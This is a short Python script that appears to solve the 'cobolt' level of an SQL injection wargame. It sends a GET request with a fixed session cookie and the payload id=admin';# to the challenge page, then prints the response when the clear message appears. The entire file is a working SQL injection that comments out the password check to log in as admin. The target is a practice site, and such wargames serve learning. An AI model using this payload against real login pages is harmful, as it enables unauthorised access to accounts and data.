import requests
headers= {'Cookie':'PHPSESSID=ilbihpsvjpl9h779141vl0ve8f'}
url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27;%23"
r = requests.get(url, headers=headers).text
if "<h2>COBOLT Clear!</h2>" in r:
    print(r)